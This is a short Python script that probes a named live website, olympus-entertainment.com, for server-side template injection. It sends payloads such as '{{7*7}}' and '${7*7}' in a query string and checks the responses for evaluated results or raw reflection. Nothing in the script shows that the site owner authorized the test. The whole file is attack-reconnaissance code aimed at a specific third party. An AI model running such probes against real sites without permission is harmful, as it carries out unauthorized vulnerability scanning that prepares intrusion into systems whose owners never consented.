import urllib.request, urllib.parse, time

headers = {
    'User-Agent': 'Mozilla/5.0 (compatible; CaseCrack/1.0)',
}

test_payloads = [
    ('{{7*7}}', '49'),
    ('{{7*8}}', '56'),
    ('${7*7}', '49'),
    ('#{7*7}', '49'),
]

for payload, expected in test_payloads:
    url = 'https://olympus-entertainment.com/?q=' + urllib.parse.quote(payload)
    try:
        req = urllib.request.Request(url, headers=headers)
        r = urllib.request.urlopen(req, timeout=10)
        body = r.read().decode('utf-8', errors='replace')
        contains_expected = expected in body
        count_hits = body.count(expected)
        # Check if the literal payload text appears (reflection without evaluation)
        contains_raw = payload in body
        print('Payload : ' + repr(payload))
        print('Expected: ' + expected + '  found=' + str(contains_expected) + '  count=' + str(count_hits) + '  raw_reflected=' + str(contains_raw))
        idx = body.find(expected)
        if idx >= 0:
            ctx = body[max(0, idx-80):idx+100].replace('\n', ' ').replace('\r', '')
            print('Context : ...' + ctx + '...')
        print()
        time.sleep(1.5)
    except Exception as e:
        print('Error with ' + repr(payload) + ': ' + str(e))
        print()
